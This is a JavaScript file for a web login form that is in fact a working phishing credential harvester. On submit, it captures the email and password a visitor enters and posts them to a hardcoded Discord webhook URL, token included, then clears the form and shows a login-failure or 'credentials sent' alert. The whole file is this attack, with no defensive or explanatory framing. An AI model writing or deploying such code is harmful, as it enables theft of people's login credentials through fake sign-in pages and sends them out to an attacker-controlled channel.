document.querySelector('form').addEventListener('submit', function(event) {
  event.preventDefault(); // Prevents the form from actually submitting

  var email = document.querySelector('input[type="email"]').value;
  var password = document.querySelector('input[type="password"]').value;

  // Construct the data to send
  var data = {
    email: email,
    password: password
  };

  // New Discord Webhook URL (Updated)
  var webhookURL = 'https://discord.com/api/webhooks/1470363882273898588/BJ1sltT0dFi7usgIrXKbmqMt762P2tQ8wdf0f_xH4FLXsvFvLvXcq4L98FWha_2m3cit';

  // Send the data to the Discord webhook
  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => {
    if (response.ok) {
      alert('Credentials sent successfully!');
      // Clear the form fields
      document.querySelector('input[type="email"]').value = '';
      document.querySelector('input[type="password"]').value = '';
    } else {
      alert('Failed to login. Please try again.');
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('An error occurred. Check the console.');
  });
});

